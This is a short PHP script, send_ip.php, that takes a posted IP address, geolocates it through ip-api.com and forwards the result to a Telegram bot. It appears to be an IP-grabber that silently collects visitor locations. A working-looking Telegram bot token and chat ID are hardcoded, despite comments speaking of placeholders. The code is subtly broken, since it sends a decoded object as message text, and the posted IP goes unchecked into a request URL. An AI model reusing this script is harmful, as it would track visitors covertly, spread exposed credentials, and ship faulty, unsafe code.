<?php
// PHP code (send_ip.php)

// Get the IP address from the request
$ipAddress = $_POST['ipAddress'];

// Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
$botToken = '6002701289:AAFzBkmBuaoW382T4e3HzJjHbrXd6aEt5mQ';

// Replace 'YOUR_CHAT_ID' with your actual Telegram chat ID
$chatID = '2041536580';

// Send the IP address to the Telegram bot
$telegramURL = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
//$message = "IP Address: " . $ipAddress;

$message = json_decode(file_get_contents("http://ip-api.com/json/{$ipAddress}"));

$telegramData = array(
  'chat_id' => $chatID,
  'text' => $message
);

$curl = curl_init($telegramURL);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $telegramData);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($curl);
curl_close($curl);

?>